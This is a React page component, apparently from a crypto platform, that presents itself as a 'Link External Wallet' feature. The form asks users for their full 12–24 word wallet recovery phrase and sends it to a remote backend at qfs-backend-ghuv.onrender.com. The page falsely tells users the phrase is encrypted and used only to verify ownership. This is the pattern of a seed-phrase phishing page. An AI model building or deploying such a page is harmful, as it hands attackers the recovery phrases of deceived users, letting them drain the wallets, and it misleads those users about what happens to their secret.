// pages/LinkWallet.jsx
import React, { useState } from "react";
import { Link, useNavigate } from "react-router-dom";
import {
  ArrowLeftIcon,
  LinkIcon,
  CheckCircleIcon,
  XCircleIcon,
  InformationCircleIcon,
} from "@heroicons/react/24/outline";

const LinkWallet = () => {
  const navigate = useNavigate();

  // Predefined wallet options
  const walletOptions = [
    "Trust Wallet",
    "MetaMask",
    "Ledger",
    "Trezor",
    "Phantom",
    "Exodus",
    "Coinbase Wallet",
    "Other",
  ];

  // State
  const [formData, setFormData] = useState({
    walletName: "Trust Wallet",
    phrase: "",
  });

  const [customWalletName, setCustomWalletName] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");
  const [linkedWallet, setLinkedWallet] = useState(null);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value,
    });
    setError("");
  };

  const handleWalletNameChange = (e) => {
    const value = e.target.value;
    setFormData({
      ...formData,
      walletName: value,
    });
    setError("");
  };

  const formatDate = (dateString) => {
    if (!dateString) return "N/A";
    try {
      return new Date(dateString).toLocaleString("en-US", {
        year: "numeric",
        month: "short",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      });
    } catch (error) {
      return "Invalid date";
    }
  };

  const validatePhrase = (phrase) => {
    const words = phrase.trim().split(/\s+/);

    if (words.length < 12) {
      return "Recovery phrase must be at least 12 words";
    }

    if (words.length > 24) {
      return "Recovery phrase cannot exceed 24 words";
    }

    // Check for basic word format (letters only, no special chars)
    const invalidWords = words.filter((word) => !/^[a-z]+$/i.test(word));
    if (invalidWords.length > 0) {
      return "Recovery phrase should contain only letters";
    }

    return "";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validation
    if (!formData.walletName.trim()) {
      setError("Please select a wallet name");
      return;
    }

    const phraseError = validatePhrase(formData.phrase);
    if (phraseError) {
      setError(phraseError);
      return;
    }

    // Use custom name if "Other" is selected
    const walletNameToSend =
      formData.walletName === "Other"
        ? customWalletName.trim()
        : formData.walletName;

    if (!walletNameToSend) {
      setError("Please enter a wallet name");
      return;
    }

    setLoading(true);
    setError("");

    try {
      const token = localStorage.getItem("token");

      if (!token) {
        navigate("/login");
        return;
      }

      const response = await fetch(
        "https://qfs-backend-ghuv.onrender.com/api/wallet/link",
        {
          method: "POST",
          headers: {
            Authorization: `Bearer ${token}`,
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            walletName: walletNameToSend,
            phrase: formData.phrase.trim(),
          }),
        }
      );

      const data = await response.json();

      if (response.ok && data.success) {
        setLinkedWallet(data.data.linkedWallet);
        setSuccess(true);
        // Reset form
        setFormData({
          walletName: "Trust Wallet",
          phrase: "",
        });
        setCustomWalletName("");
      } else {
        setError(data.message || "Failed to link wallet. Please try again.");
      }
    } catch (error) {
      setError("Network error. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-lg mx-auto">
      {/* Header */}
      <div className="flex items-center mb-8">
        <Link to="/dashboard" className="mr-4">
          <div className="h-10 w-10 rounded-full bg-emerald-100 flex items-center justify-center hover:bg-emerald-200 transition-colors">
            <ArrowLeftIcon className="h-5 w-5 text-emerald-700" />
          </div>
        </Link>
        <div>
          <h1 className="text-2xl font-bold text-gray-900">
            Link External Wallet
          </h1>
          <p className="text-gray-600">
            Connect your existing cryptocurrency wallet
          </p>
        </div>
      </div>

      {/* Link Wallet Card */}
      <div className="bg-gradient-to-br from-emerald-900 to-green-900 rounded-2xl border border-emerald-800 shadow-xl overflow-hidden mb-8">
        {/* Card Header */}
        <div className="px-6 pt-6 pb-4 border-b border-emerald-800">
          <div className="flex items-center justify-between">
            <div>
              <h2 className="text-xl font-bold text-white">Link Your Wallet</h2>
              <p className="text-emerald-300 text-sm mt-1">
                Connect an external wallet to your account
              </p>
            </div>
            <div className="h-10 w-10 rounded-full bg-emerald-800 flex items-center justify-center">
              <LinkIcon className="h-5 w-5 text-emerald-300" />
            </div>
          </div>
        </div>

        {/* Form/Result */}
        <div className="p-6">
          {success && linkedWallet ? (
            <div className="space-y-6">
              {/* Success Header */}
              <div className="text-center">
                <div className="h-16 w-16 rounded-full bg-emerald-700 flex items-center justify-center mx-auto mb-4">
                  <CheckCircleIcon className="h-8 w-8 text-white" />
                </div>
                <h3 className="text-xl font-bold text-white mb-2">
                  Wallet Linked Successfully!
                </h3>
                <p className="text-emerald-300">
                  Your wallet has been connected to your account.
                </p>
              </div>

              {/* Wallet Details */}
              <div className="bg-emerald-950/50 rounded-xl p-4 border border-emerald-800">
                <h4 className="text-sm text-emerald-300 font-medium mb-3">
                  Linked Wallet Details
                </h4>
                <div className="space-y-2">
                  <div className="flex justify-between">
                    <span className="text-emerald-400 text-sm">
                      Wallet Name
                    </span>
                    <span className="text-white text-sm font-medium">
                      {linkedWallet.walletName}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-emerald-400 text-sm">Status</span>
                    <span
                      className={`px-2 py-1 text-xs rounded-full ${
                        linkedWallet.isActive
                          ? "bg-emerald-900/50 text-emerald-300"
                          : "bg-red-900/50 text-red-300"
                      }`}
                    >
                      {linkedWallet.isActive ? "Active" : "Inactive"}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-emerald-400 text-sm">Linked On</span>
                    <span className="text-white text-sm font-medium">
                      {formatDate(linkedWallet.linkedAt)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-emerald-400 text-sm">
                      Last Accessed
                    </span>
                    <span className="text-white text-sm font-medium">
                      {formatDate(linkedWallet.lastAccessed)}
                    </span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-emerald-400 text-sm">Wallet ID</span>
                    <span className="text-white text-sm font-medium font-mono">
                      {linkedWallet.id.slice(-8)}
                    </span>
                  </div>
                </div>
              </div>

              {/* Next Steps */}
              <div className="bg-emerald-950/30 rounded-lg p-4 border border-emerald-800/50">
                <h4 className="text-sm text-emerald-300 font-medium mb-2">
                  What's Next?
                </h4>
                <ul className="text-xs text-emerald-400 space-y-1">
                  <li className="flex items-start">
                    <span className="mr-2">•</span>
                    <span>
                      Your linked wallet will appear in your dashboard
                    </span>
                  </li>
                  <li className="flex items-start">
                    <span className="mr-2">•</span>
                    <span>
                      You can now receive funds directly to this wallet
                    </span>
                  </li>
                  <li className="flex items-start">
                    <span className="mr-2">•</span>
                    <span>
                      Manage linked wallets from your account settings
                    </span>
                  </li>
                </ul>
              </div>

              {/* Action Buttons */}
              <div className="flex gap-3">
                <button
                  onClick={() => setSuccess(false)}
                  className="flex-1 py-2 bg-emerald-800 text-emerald-300 rounded-lg hover:bg-emerald-700 transition-colors"
                >
                  Link Another Wallet
                </button>
                <Link
                  to="/dashboard"
                  className="flex-1 py-2 text-center bg-emerald-600 text-white rounded-lg hover:bg-emerald-500 transition-colors"
                >
                  Back to Dashboard
                </Link>
              </div>
            </div>
          ) : (
            <form onSubmit={handleSubmit}>
              {/* Wallet Selection */}
              <div className="mb-4">
                <label className="block text-sm text-emerald-300 font-medium mb-2">
                  Select Wallet Type
                </label>
                <div className="relative">
                  <select
                    value={formData.walletName}
                    onChange={handleWalletNameChange}
                    className="w-full appearance-none bg-emerald-900 border border-emerald-700 rounded-xl pl-4 pr-10 py-3 text-white font-medium focus:outline-none focus:border-emerald-500 cursor-pointer"
                  >
                    {walletOptions.map((wallet) => (
                      <option key={wallet} value={wallet}>
                        {wallet}
                      </option>
                    ))}
                  </select>
                  <ArrowLeftIcon className="h-4 w-4 text-emerald-400 absolute right-3 top-4 pointer-events-none rotate-90" />
                </div>
              </div>

              {/* Custom Wallet Name (if Other is selected) */}
              {formData.walletName === "Other" && (
                <div className="mb-4">
                  <label className="block text-sm text-emerald-300 font-medium mb-2">
                    Enter Wallet Name
                  </label>
                  <input
                    type="text"
                    value={customWalletName}
                    onChange={(e) => setCustomWalletName(e.target.value)}
                    placeholder="e.g., My Hardware Wallet"
                    className="w-full bg-emerald-900 border border-emerald-700 rounded-xl px-4 py-3 text-white placeholder-emerald-400 focus:outline-none focus:border-emerald-500"
                  />
                </div>
              )}

              {/* Recovery Phrase */}
              <div className="mb-6">
                <label className="block text-sm text-emerald-300 font-medium mb-2">
                  Recovery Phrase (12-24 words)
                </label>
                <textarea
                  name="phrase"
                  value={formData.phrase}
                  onChange={handleInputChange}
                  placeholder="Enter your 12 to 24 word recovery phrase separated by spaces"
                  rows="4"
                  className="w-full bg-emerald-900 border border-emerald-700 rounded-xl px-4 py-3 text-white placeholder-emerald-400 focus:outline-none focus:border-emerald-500 resize-none"
                />
                <div className="text-xs text-emerald-500 mt-1">
                  Enter words separated by spaces. 12-24 words required.
                </div>
              </div>

              {/* Error Message */}
              {error && (
                <div className="mb-4 p-3 bg-red-900/20 border border-red-800 rounded-lg">
                  <div className="flex items-center">
                    <XCircleIcon className="h-4 w-4 text-red-400 mr-2 flex-shrink-0" />
                    <span className="text-red-300 text-sm">{error}</span>
                  </div>
                </div>
              )}

              {/* Submit Button */}
              <button
                type="submit"
                disabled={loading}
                className={`w-full py-3 rounded-xl font-bold text-white transition-all ${
                  loading
                    ? "bg-emerald-800/50 text-emerald-400 cursor-not-allowed"
                    : "bg-emerald-600 hover:bg-emerald-500 shadow-lg"
                }`}
              >
                {loading ? "Linking Wallet..." : "Link Wallet"}
              </button>

              {/* Information */}
              <div className="mt-4 flex items-start text-xs text-emerald-400">
                <InformationCircleIcon className="h-4 w-4 mr-2 mt-0.5 flex-shrink-0" />
                <p>
                  Your recovery phrase is encrypted and stored securely. It is
                  only used to verify wallet ownership.
                </p>
              </div>
            </form>
          )}
        </div>
      </div>

      {/* Supported Wallets Info */}
      <div className="bg-white rounded-xl border border-emerald-100 shadow-sm">
        <div className="px-4 py-3 border-b border-emerald-100">
          <h3 className="font-medium text-gray-900">Supported Wallets</h3>
        </div>
        <div className="p-4">
          <div className="grid grid-cols-2 gap-3">
            {walletOptions
              .filter((w) => w !== "Other")
              .map((wallet) => (
                <div
                  key={wallet}
                  className="flex items-center p-2 bg-emerald-50 rounded-lg"
                >
                  <div className="h-8 w-8 rounded-full bg-emerald-100 flex items-center justify-center mr-3">
                    <LinkIcon className="h-4 w-4 text-emerald-600" />
                  </div>
                  <span className="text-sm font-medium text-gray-900">
                    {wallet}
                  </span>
                </div>
              ))}
          </div>
          <p className="text-xs text-gray-500 mt-3 mb-9">
            Most popular cryptocurrency wallets are supported. Contact support
            if your wallet is not listed.
          </p>
        </div>
      </div>
    </div>
  );
};

export default LinkWallet;
